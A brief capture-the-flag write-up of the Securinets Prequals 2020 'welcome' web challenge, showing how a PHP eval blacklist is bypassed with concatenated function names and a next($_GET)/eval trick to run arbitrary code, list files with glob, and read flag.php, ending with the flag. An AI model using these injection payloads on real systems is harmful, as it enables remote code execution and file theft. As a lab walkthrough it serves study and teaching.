# Welcome Challenge [web]  Securinets Prequals 2K20

his write-up is about the challenge "welcome" 
writeup on ctf time here :  https://ctftime.org/writeup/19026
## ## The Challenge
Looking at the first challenge ,  When we opened the address in the browser, we were given a number "1" with parametre **/?cmd=print(1)**
when change command i get msg "your input is blacklisted "
so first we need to know what function disable by execution phpinfo() function and  to bypass the `preg_match` filters.

our request would be : **`/?cmd=$f=p.h.p.i.n.f.o; $f();`**
If you look at result . you will notice that `file_get_contents` is not in the list and many other function but first we need to search about what is the flag file name . 
so i we need to make command that execute next \$_Get parametre with next() fonction  and execute it with eval so our request would be  : 

    `$n=ne.xt;eval($n($_GET));`

We won’t go into details in this part, but basically you could use `glob` to find the files. 

    `/cmd=$n=ne.xt;eval($n($_GET));&a=print_r(glob("*"));`

===>
Array ( [0] => flag.php [1] => index.php )

so our file name is flag.php . so  change a lil bit tha request parametre by include **file_get_contents** fonction on **print_r** 

**`cmd=$n=ne.xt;eval($n($_GET));&a=print_r(file_get_contents(%22flag.php%22));`**
TAB : Ctrl + u : 

***`$flaG='securinets{just_pHp_warMup_xD}';`***
